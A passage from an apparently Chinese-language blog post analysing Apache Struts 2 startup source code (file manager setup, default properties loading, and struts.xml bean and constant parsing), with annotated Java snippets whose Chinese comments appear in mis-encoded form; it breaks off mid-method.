<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init_FileManager</span><span class="params">()</span> <span class="keyword">throws</span> ClassNotFoundException &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœ filteråˆå§‹åŒ–å‚æ•°ä¸­é…ç½®äº† struts.fileManager å‚æ•°åˆ™ä½¿ç”¨ç”¨æˆ·è‡ªå®šä»¥çš„æ–‡ä»¶ç®¡ç†å™¨  å®ç°äº†FileManagerç±»</span></span><br><span class="line">        <span class="comment">// ä¸»è¦åŠŸèƒ½æ˜¯è¿›è¡Œæ–‡ä»¶çš„è¯»å†™ä¸ä¿®æ”¹çš„ç›‘æ§</span></span><br><span class="line">        <span class="keyword">if</span> (initParams.containsKey(StrutsConstants.STRUTS_FILE_MANAGER)) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileManagerClassName</span> <span class="operator">=</span> initParams.get(StrutsConstants.STRUTS_FILE_MANAGER);</span><br><span class="line">            <span class="keyword">final</span> Class&lt;FileManager&gt; fileManagerClass = (Class&lt;FileManager&gt;) Class.forName(fileManagerClassName);</span><br><span class="line">            LOG.info(<span class="string">&quot;Custom FileManager specified: &#123;&#125;&quot;</span>, fileManagerClassName);</span><br><span class="line">            configurationManager.addContainerProvider(<span class="keyword">new</span> <span class="title class_">FileManagerProvider</span>(fileManagerClass, fileManagerClass.getSimpleName()));</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="comment">// ä½¿ç”¨é»˜è®¤çš„æ–‡ä»¶ç®¡ç†å™¨</span></span><br><span class="line">            <span class="comment">// add any other Struts 2 provided implementations of FileManager</span></span><br><span class="line">            configurationManager.addContainerProvider(<span class="keyword">new</span> <span class="title class_">FileManagerProvider</span>(JBossFileManager.class, <span class="string">&quot;jboss&quot;</span>));</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// å¦‚æœè®¾ç½®äº†æ–‡ä»¶ç®¡ç†å™¨å·¥å‚  struts.fileManagerFactory</span></span><br><span class="line">        <span class="comment">// è¿™äº›provideréƒ½è¢«æ·»åŠ åˆ°  ContainerProvideråˆ—è¡¨ä¸­å»äº†ï¼Œåé¢åº”è¯¥ä¼šç»Ÿä¸€è°ƒç”¨ ä»–ä»¬çš„registeræ–¹æ³•å°†ä»–ä»¬ä¸€èµ·æ³¨å†Œåˆ°å®¹å™¨ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (initParams.containsKey(StrutsConstants.STRUTS_FILE_MANAGER_FACTORY)) &#123;</span><br><span class="line">            <span class="keyword">final</span> <span class="type">String</span> <span class="variable">fileManagerFactoryClassName</span> <span class="operator">=</span> initParams.get(StrutsConstants.STRUTS_FILE_MANAGER_FACTORY);</span><br><span class="line">            <span class="keyword">final</span> Class&lt;FileManagerFactory&gt; fileManagerFactoryClass = (Class&lt;FileManagerFactory&gt;) Class.forName(fileManagerFactoryClassName);</span><br><span class="line">            LOG.info(<span class="string">&quot;Custom FileManagerFactory specified: &#123;&#125;&quot;</span>, fileManagerFactoryClassName);</span><br><span class="line">            configurationManager.addContainerProvider(<span class="keyword">new</span> <span class="title class_">FileManagerFactoryProvider</span>(fileManagerFactoryClass));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="é»˜è®¤å±æ€§åˆå§‹åŒ–"><a href="#é»˜è®¤å±æ€§åˆå§‹åŒ–" class="headerlink" title="é»˜è®¤å±æ€§åˆå§‹åŒ–"></a>é»˜è®¤å±æ€§åˆå§‹åŒ–</h3><p>ä¸»è¦åŠ¨ä½œæ˜¯å‘containerProviderä¸­æ·»åŠ äº† <code>DefaultPropertiesProvider</code>å¯¹è±¡ï¼Œæˆ‘ä»¬é‡ç‚¹å…³æ³¨å…¶<code>register</code>æ–¹æ³•  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder builder, LocatableProperties props)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// ä»org/apache/struts2/default.propertiesæ–‡ä»¶ä¸­åŠ è½½é»˜è®¤å±æ€§</span></span><br><span class="line">            <span class="type">PropertiesSettings</span> <span class="variable">defaultSettings</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">PropertiesSettings</span>(<span class="string">&quot;org/apache/struts2/default&quot;</span>);</span><br><span class="line">            loadSettings(props, defaultSettings);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Could not find or error in org/apache/struts2/default.properties&quot;</span>, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="title function_">PropertiesSettings</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="comment">// å°è¯•ä»å¤šä¸ªä¸åŒçš„ç±»åŠ è½½å™¨ä¸­åŠ è½½å±æ€§æ–‡ä»¶ é»˜è®¤æ˜¯ä»å½“å‰ä¸Šä¸‹æ–‡ç±»åŠ è½½å™¨åŠ è½½</span></span><br><span class="line">        <span class="type">URL</span> <span class="variable">settingsUrl</span> <span class="operator">=</span> ClassLoaderUtil.getResource(name + <span class="string">&quot;.properties&quot;</span>, getClass());</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (settingsUrl == <span class="literal">null</span>) &#123;</span><br><span class="line">            LOG.debug(<span class="string">&quot;&#123;&#125;.properties missing&quot;</span>, name);</span><br><span class="line">            settings = <span class="keyword">new</span> <span class="title class_">LocatableProperties</span>();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="comment">// LocatableProperties ç±»æ˜¯ Properties çš„å­ç±» å¢åŠ äº†å±æ€§çš„å®šä½åŠŸèƒ½ï¼ŒåŒ…æ‹¬å±æ€§æ‰€åœ¨è¡Œ å±æ€§çš„æ³¨é‡Š å±æ€§æ‰€åœ¨æ–‡ä»¶çš„urlä¿¡æ¯</span></span><br><span class="line">        settings = <span class="keyword">new</span> <span class="title class_">LocatableProperties</span>(<span class="keyword">new</span> <span class="title class_">LocationImpl</span>(<span class="literal">null</span>, settingsUrl.toString()));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Load settings</span></span><br><span class="line">        <span class="keyword">try</span> (<span class="type">InputStream</span> <span class="variable">in</span> <span class="operator">=</span> settingsUrl.openStream()) &#123;</span><br><span class="line">            <span class="comment">// æ­£å¼ä»å±æ€§æ–‡ä»¶ä¸­åŠ è½½å±æ€§ å±æ€§å­˜å‚¨åœ¨çˆ¶ç±»å¯¹è±¡ Properties ä¸­</span></span><br><span class="line">        <span class="comment">// LocatableProperties ç±»ä¸­ç›´æ¥å­˜å‚¨çš„æ˜¯å®šä½ä¿¡æ¯</span></span><br><span class="line">            settings.load(in);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">StrutsException</span>(<span class="string">&quot;Could not load &quot;</span> + name + <span class="string">&quot;.properties: &quot;</span> + e, e);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// å°†åŠ è½½çš„é»˜è®¤ä¹¦ä¿¡å¤åˆ¶ä¸€ä»½åˆ° registeræ–¹æ³•ä¼ å…¥çš„ propså‚æ•°ä¸­</span></span><br><span class="line"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">loadSettings</span><span class="params">(LocatableProperties props, <span class="keyword">final</span> Settings settings)</span> &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">Iterator</span> <span class="variable">i</span> <span class="operator">=</span> settings.list(); i.hasNext(); ) &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> (String) i.next();</span><br><span class="line">            props.setProperty(name, settings.get(name), settings.getLocation(name));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<h3 id="ä¼ ç»Ÿxmlé…ç½®æ–‡ä»¶åˆå§‹åŒ–"><a href="#ä¼ ç»Ÿxmlé…ç½®æ–‡ä»¶åˆå§‹åŒ–" class="headerlink" title="ä¼ ç»Ÿxmlé…ç½®æ–‡ä»¶åˆå§‹åŒ–"></a>ä¼ ç»Ÿxmlé…ç½®æ–‡ä»¶åˆå§‹åŒ–</h3><figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">init_TraditionalXmlConfigurations</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="comment">// å°è¯•ä»è¿‡æ»¤å™¨åˆå§‹åŒ–å‚æ•°ä¸­è·å–é…ç½®è·¯å¾„</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">configPaths</span> <span class="operator">=</span> initParams.get(<span class="string">&quot;config&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (configPaths == <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="comment">// å¦‚æœæ²¡æœ‰é…ç½®åˆ™ä½¿ç”¨é»˜è®¤é…ç½®è·¯å¾„</span></span><br><span class="line">        <span class="comment">// struts-default.xml,struts-plugin.xml,struts.xml</span></span><br><span class="line">            configPaths = DEFAULT_CONFIGURATION_PATHS;</span><br><span class="line">        &#125;</span><br><span class="line">        String[] files = configPaths.split(<span class="string">&quot;\\s*[,]\\s*&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span> (String file : files) &#123;</span><br><span class="line">            <span class="keyword">if</span> (file.endsWith(<span class="string">&quot;.xml&quot;</span>)) &#123;</span><br><span class="line">                <span class="comment">// æ¯ä¸€ä¸ªæ–‡ä»¶æ·»åŠ  ä¸€ä¸ªxmlConfiguationProider</span></span><br><span class="line">                configurationManager.addContainerProvider(createStrutsXmlConfigurationProvider(file, <span class="literal">false</span>, servletContext));</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">IllegalArgumentException</span>(<span class="string">&quot;Invalid configuration file name&quot;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>é‡ç‚¹å…³æ³¨<code>StrutsXmlConfigurationProvider</code>çš„<code>register</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder containerBuilder, LocatableProperties props)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">    <span class="comment">// å¦‚æœæœ‰ä¼ å…¥servletContext åˆ™æ­¤æ—¶å°†servletContextå¯¹è±¡æ·»åŠ åˆ°å®¹å™¨ä¸­</span></span><br><span class="line">        <span class="keyword">if</span> (servletContext != <span class="literal">null</span> &amp;&amp; !containerBuilder.contains(ServletContext.class)) &#123;</span><br><span class="line">            containerBuilder.factory(ServletContext.class, <span class="keyword">new</span> <span class="title class_">Factory</span>&lt;ServletContext&gt;() &#123;</span><br><span class="line">                <span class="keyword">public</span> ServletContext <span class="title function_">create</span><span class="params">(Context context)</span> <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">                    <span class="keyword">return</span> servletContext;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">public</span> Class&lt;? <span class="keyword">extends</span> <span class="title class_">ServletContext</span>&gt; type() &#123;</span><br><span class="line">                    <span class="keyword">return</span> servletContext.getClass();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// è°ƒç”¨çˆ¶ç±»çš„registeræ–¹æ³•</span></span><br><span class="line">        <span class="built_in">super</span>.register(containerBuilder, props);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>register çš„æ—¶å€™  å¦‚æœ documents ä¸ä¸ºç©ºæ‰ä¼šæœ‰æ‰€åŠ¨ä½œ  </p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">register</span><span class="params">(ContainerBuilder containerBuilder, LocatableProperties props)</span> <span class="keyword">throws</span> ConfigurationException &#123;</span><br><span class="line">        LOG.trace(<span class="string">&quot;Parsing configuration file [&#123;&#125;]&quot;</span>, configFileName);</span><br><span class="line">        Map&lt;String, Node&gt; loadedBeans = <span class="keyword">new</span> <span class="title class_">HashMap</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">for</span> (Document doc : documents) &#123;</span><br><span class="line">            <span class="type">Element</span> <span class="variable">rootElement</span> <span class="operator">=</span> doc.getDocumentElement();</span><br><span class="line">            <span class="type">NodeList</span> <span class="variable">children</span> <span class="operator">=</span> rootElement.getChildNodes();</span><br><span class="line">            <span class="type">int</span> <span class="variable">childSize</span> <span class="operator">=</span> children.getLength();</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> <span class="number">0</span>; i &lt; childSize; i++) &#123;</span><br><span class="line">                <span class="type">Node</span> <span class="variable">childNode</span> <span class="operator">=</span> children.item(i);</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (childNode <span class="keyword">instanceof</span> Element) &#123;</span><br><span class="line">                    <span class="type">Element</span> <span class="variable">child</span> <span class="operator">=</span> (Element) childNode;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">final</span> <span class="type">String</span> <span class="variable">nodeName</span> <span class="operator">=</span> child.getNodeName();</span><br><span class="line">                    <span class="comment">// è§£æbeanæ ‡ç­¾</span></span><br><span class="line">                    <span class="keyword">if</span> (<span class="string">&quot;bean&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        <span class="comment">// ç±»å‹å±æ€§</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">type</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">                        <span class="comment">// beanåç§°  åŒä¸€ä¸ªç±»å¯ä»¥æœ‰å¤šä¸ªbeanåç§°   </span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="comment">// bean çš„å®ç°ç±»</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">impl</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;class&quot;</span>);</span><br><span class="line">                        <span class="comment">// æ˜¯å¦è¿›è¡Œé™æ€æ’å…¥   å®¹å™¨ä¼šè§£æç±»çš„é™æ€å±æ€§</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">onlyStatic</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;static&quot;</span>);</span><br><span class="line">                        <span class="comment">// beançš„ç”Ÿå‘½å‘¨æœŸ</span></span><br><span class="line">                        <span class="type">String</span> <span class="variable">scopeStr</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;scope&quot;</span>);</span><br><span class="line">                        <span class="comment">// æ˜¯å¦æ˜¯å¯é€‰çš„</span></span><br><span class="line">                        <span class="comment">// å½“optionalå±æ€§ä¸ºtrueæ—¶ï¼Œå³ä¾¿classä¸å­˜åœ¨åŠ è½½ä¹Ÿä¸ä¼šå¤±è´¥</span></span><br><span class="line">                        <span class="type">boolean</span> <span class="variable">optional</span> <span class="operator">=</span> <span class="string">&quot;true&quot;</span>.equals(child.getAttribute(<span class="string">&quot;optional&quot;</span>));</span><br><span class="line">                        <span class="type">Scope</span> <span class="variable">scope</span> <span class="operator">=</span> Scope.SINGLETON;</span><br><span class="line">                        <span class="comment">// å¤šå®ä¾‹</span></span><br><span class="line">                        <span class="keyword">if</span> (<span class="string">&quot;prototype&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.PROTOTYPE;</span><br><span class="line">                            <span class="comment">// åªåœ¨ä¸€æ¬¡è¯·æ±‚è¿‡ç¨‹ä¸­æœ‰æ•ˆ</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;request&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.REQUEST;</span><br><span class="line">                            <span class="comment">// åœ¨ä¸€ä¸ªsessionä¸­æœ‰æ•ˆ</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;session&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.SESSION;</span><br><span class="line">                            <span class="comment">// å•ä¾‹</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;singleton&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.SINGLETON;</span><br><span class="line">                            <span class="comment">// åœ¨å½“å‰çº¿ç¨‹ä¸­æœ‰æ•ˆ</span></span><br><span class="line">                        &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;thread&quot;</span>.equals(scopeStr)) &#123;</span><br><span class="line">                            scope = Scope.THREAD;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (StringUtils.isEmpty(name)) &#123;</span><br><span class="line">                            name = Container.DEFAULT_NAME;</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">try</span> &#123;</span><br><span class="line">                            <span class="comment">// åŠ è½½beançš„å®ç°ç±»</span></span><br><span class="line">                            <span class="type">Class</span> <span class="variable">classImpl</span> <span class="operator">=</span> ClassLoaderUtil.loadClass(impl, getClass());</span><br><span class="line">                            <span class="type">Class</span> <span class="variable">classType</span> <span class="operator">=</span> classImpl;</span><br><span class="line">                            <span class="comment">// å¦‚æœæŒ‡å®šäº†beançš„ç±»å‹åˆ™ä½¿ç”¨æŒ‡å®šçš„ç±»å‹</span></span><br><span class="line">                            <span class="comment">// å¦åˆ™ä»¥å®ç°ç±»çš„ç±»å‹ä¸ºbeançš„ç±»å‹</span></span><br><span class="line">                            <span class="keyword">if</span> (StringUtils.isNotEmpty(type)) &#123;</span><br><span class="line">                                classType = ClassLoaderUtil.loadClass(type, getClass());</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// å¦‚æœæ˜¯é™æ€æ³¨å…¥</span></span><br><span class="line">                            <span class="keyword">if</span> (<span class="string">&quot;true&quot;</span>.equals(onlyStatic)) &#123;</span><br><span class="line">                                <span class="comment">// Force loading of class to detect no class def found exceptions</span></span><br><span class="line">                                classImpl.getDeclaredClasses();</span><br><span class="line">                                <span class="comment">// åœ¨åˆ›å»ºæ—¶ï¼Œå‘beanä¸­æ³¨å…¥é™æ€å­—æ®µä»¥åŠæ–¹æ³•</span></span><br><span class="line">                                containerBuilder.injectStatics(classImpl);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="comment">// å¦‚æœå·²ç»å­˜åœ¨åŒååŒç±»å‹çš„beanäº†</span></span><br><span class="line">                                <span class="keyword">if</span> (containerBuilder.contains(classType, name)) &#123;</span><br><span class="line">                                    <span class="comment">// è·å–å½“å‰beanèŠ‚ç‚¹åœ¨xmlæ–‡ä»¶ä¸­çš„å®šä½ å¾—åˆ°ä¸€ä¸ªLocationImplå¯¹è±¡</span></span><br><span class="line">                                    <span class="comment">// åŒ…æ‹¬è¡Œå· åˆ—å· uri è¿™ä¸‰ä¸ªæ¥è‡ªå‘½åç©ºé—´ http://struts.apache.org/xwork/location ä¸‹çš„å±æ€§</span></span><br><span class="line">                                    <span class="comment">// å¦‚ &lt;t xmlns:s=http://struts.apache.org/xwork/location s:src=&quot;&quot; s:row=&quot;&quot; s:col=&quot;&quot;&gt;</span></span><br><span class="line">                                    <span class="type">Location</span> <span class="variable">loc</span> <span class="operator">=</span> LocationUtils.getLocation(loadedBeans.get(classType.getName() + name));</span><br><span class="line">                                    <span class="comment">// å­˜åœ¨é‡å¤çš„beanç›´æ¥å°±æŠ›å‡ºå¼‚å¸¸äº† è¿™ä¸ªå€¼é»˜è®¤ä¸ºtrue</span></span><br><span class="line">                                    <span class="keyword">if</span> (throwExceptionOnDuplicateBeans) &#123;</span><br><span class="line">                                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Bean type &quot;</span> + classType + <span class="string">&quot; with the name &quot;</span> +</span><br><span class="line">                                                name + <span class="string">&quot; has already been loaded by &quot;</span> + loc, child);</span><br><span class="line">                                    &#125;</span><br><span class="line">                                &#125;</span><br><span class="line"></span><br><span class="line">                                <span class="comment">// Force loading of class to detect no class def found exceptions</span></span><br><span class="line">                                <span class="comment">// å¼ºåˆ¶è¿›è¡Œç±»åŠ è½½  å¯èƒ½è·Ÿç±»çš„åŠ è½½æœºåˆ¶æœ‰å…³ç³»  æ‡’åŠ è½½</span></span><br><span class="line">                                <span class="comment">// ä½¿ç”¨ loadClass æ–¹æ³•åŠ è½½çš„ç±»å¹¶æ²¡æœ‰æ‰§è¡Œé™æ€ä»£ç å—</span></span><br><span class="line">                                <span class="comment">// è°ƒç”¨è¯¥æ–¹æ³•è¿›è¡Œç±»çš„å¼ºåˆ¶åŠ è½½</span></span><br><span class="line">                                classImpl.getDeclaredConstructors();</span><br><span class="line"></span><br><span class="line">                                LOG.debug(<span class="string">&quot;Loaded type: &#123;&#125; name: &#123;&#125; impl: &#123;&#125;&quot;</span>, type, name, impl);</span><br><span class="line">                                <span class="comment">// å°†beanæ³¨å…¥åˆ°å®¹å™¨ä¸­  è¯¥æ–¹æ³•åé¢å†åˆ†æ</span></span><br><span class="line">                                containerBuilder.factory(classType, name, <span class="keyword">new</span> <span class="title class_">LocatableFactory</span>(name, classType, classImpl, scope, childNode), scope);</span><br><span class="line">                            &#125;</span><br><span class="line">                            <span class="comment">// è®°å½•åŠ è½½çš„bean</span></span><br><span class="line">                            loadedBeans.put(classType.getName() + name, child);</span><br><span class="line">                        &#125; <span class="keyword">catch</span> (Throwable ex) &#123;</span><br><span class="line">                            <span class="keyword">if</span> (!optional) &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Unable to load bean: type:&quot;</span> + type + <span class="string">&quot; class:&quot;</span> + impl, ex, childNode);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                LOG.debug(<span class="string">&quot;Unable to load optional class: &#123;&#125;&quot;</span>, impl);</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// åœ¨ struts.xml ä¸­å®šä¹‰å¸¸é‡ï¼Œè¿™äº›å¸¸é‡å¯ä»¥åœ¨ Struts 2 çš„é…ç½®æ–‡ä»¶å’Œå…¶ä»–éƒ¨åˆ†ä½¿ç”¨ã€‚</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="string">&quot;constant&quot;</span>.equals(nodeName)) &#123;</span><br><span class="line">                        <span class="type">String</span> <span class="variable">name</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">                        <span class="type">String</span> <span class="variable">value</span> <span class="operator">=</span> child.getAttribute(<span class="string">&quot;value&quot;</span>);</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (valueSubstitutor != <span class="literal">null</span>) &#123;</span><br><span class="line">                            LOG.debug(<span class="string">&quot;Substituting value [&#123;&#125;] using [&#123;&#125;]&quot;</span>, value, valueSubstitutor.getClass().getName());</span><br><span class="line">                            value = valueSubstitutor.substitute(value);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="comment">// å’Œpropertiesæ–‡ä»¶çš„å±æ€§ä¸€ä¸ªä»¥è¥¿  </span></span><br><span class="line">                        props.setProperty(name, value, childNode);</span><br><span class="line">                        <span class="comment">// è¯¥æ ‡ç­¾è¢«ç”¨äºå¤„ç†é‚£äº›åœ¨æ­£å¸¸å¤„ç†æµç¨‹ä¸­æœªè¢«è¯†åˆ«æˆ–æœªè¢«å¤„ç†çš„è¯·æ±‚</span></span><br><span class="line">                    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (nodeName.equals(<span class="string">&quot;unknown-handler-stack&quot;</span>)) &#123;</span><br><span class="line">                        List&lt;UnknownHandlerConfig&gt; unknownHandlerStack = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;UnknownHandlerConfig&gt;();</span><br><span class="line">                        <span class="comment">// å®šä¹‰å¤„ç†å™¨åˆ—è¡¨</span></span><br><span class="line">                        <span class="type">NodeList</span> <span class="variable">unknownHandlers</span> <span class="operator">=</span> child.getElementsByTagName(<span class="string">&quot;unknown-handler-ref&quot;</span>);</span><br><span class="line">                        <span class="type">int</span> <span class="variable">unknownHandlersSize</span> <span class="operator">=</span> unknownHandlers.getLength();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">for</span> (<span class="type">int</span> <span class="variable">k</span> <span class="operator">=</span> <span class="number">0</span>; k &lt; unknownHandlersSize; k++) &#123;</span><br><span class="line">                            <span class="type">Element</span> <span class="variable">unknownHandler</span> <span class="operator">=</span> (Element) unknownHandlers.item(k);</span><br><span class="line">                            <span class="type">Location</span> <span class="variable">location</span> <span class="operator">=</span> LocationUtils.getLocation(unknownHandler);</span><br><span class="line">                            <span class="comment">// é€šè¿‡åç§°è¿›è¡Œå¼•ç”¨</span></span><br><span class="line">                            <span class="comment">// åœ¨ä½¿ç”¨æ—¶éœ€è¦å…ˆå®šä¹‰  unknown-handler æ ‡ç­¾</span></span><br><span class="line">                            <span class="comment">// &lt;unknown-handler name=&quot;defaultUnknownHandler&quot; class=&quot;com.example.DefaultUnknownHandler&quot; /&gt;</span></span><br><span class="line">                            <span class="comment">// &lt;unknown-handler name=&quot;customUnknownHandler&quot; class=&quot;com.example.CustomUnknownHandler&quot; /&gt;</span></span><br><span class="line"></span><br><span class="line">                                    unknownHandlerStack.add(<span class="keyword">new</span> <span class="title class_">UnknownHandlerConfig</span>(unknownHandler.getAttribute(<span class="string">&quot;name&quot;</span>), location));</span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">if</span> (!unknownHandlerStack.isEmpty())</span><br><span class="line">                            <span class="comment">// configurationç”±initæ–¹æ³•ä¼ å…¥   å…·ä½“ç”¨å¤„ç›®å‰è¿˜ä¸çŸ¥é“</span></span><br><span class="line">                            <span class="comment">// ä½†åº”è¯¥æ˜¯åœ¨è¯·æ±‚æ— æ³•è¢«åŒ¹é…çš„ä¹‹åå°†ä»è¿™ä¸ªconfigurrationä¸­å–å‡º handlerå¯¹è¯·æ±‚è¿›è¡Œå¤„ç†</span></span><br><span class="line">                            configuration.setUnknownHandlerStack(unknownHandlerStack);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<p>documents åœ¨<code>init</code>æ–¹æ³•è°ƒç”¨æ—¶æ‰ä¼šè¢«è®¾ç½®<br>è¿™ä¹Ÿå°±æ˜¯è¯´æ˜  <code>containerProvider</code>åœ¨è°ƒç”¨registeræ–¹æ³•å‰ä¼šå…ˆè°ƒç”¨<code>init</code>æ–¹æ³•</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">init</span><span class="params">(Configuration configuration)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.configuration = configuration;</span><br><span class="line">        <span class="built_in">this</span>.includedFileNames = configuration.getLoadedFileNames();</span><br><span class="line">        loadDocuments(configFileName);</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">loadDocuments</span><span class="params">(String configFileName)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">        loadedFileUrls.clear();</span><br><span class="line">        documents = loadConfigurationFiles(configFileName, <span class="literal">null</span>);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (ConfigurationException e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> e;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">ConfigurationException</span>(<span class="string">&quot;Error loading configuration file &quot;</span> + configFileName, e);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">private</span> List&lt;Document&gt; <span class="title function_">loadConfigurationFiles</span><span class="params">(String fileName, Element includeElement)</span> &#123;</span><br><span class="line">        List&lt;Document&gt; docs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        List&lt;Document&gt; finalDocs = <span class="keyword">new</span> <span class="title class_">ArrayList</span>&lt;&gt;();</span><br><span class="line">        <span class="keyword">if</span> (!includedFileNames.contains(fileName)) &#123;</span><br><span class="line">        LOG.debug(<span class="string">&quot;Loading action configurations from: &#123;&#125;&quot;</span>, fileName);</span><br><span class="line"></span><br><span class="line">        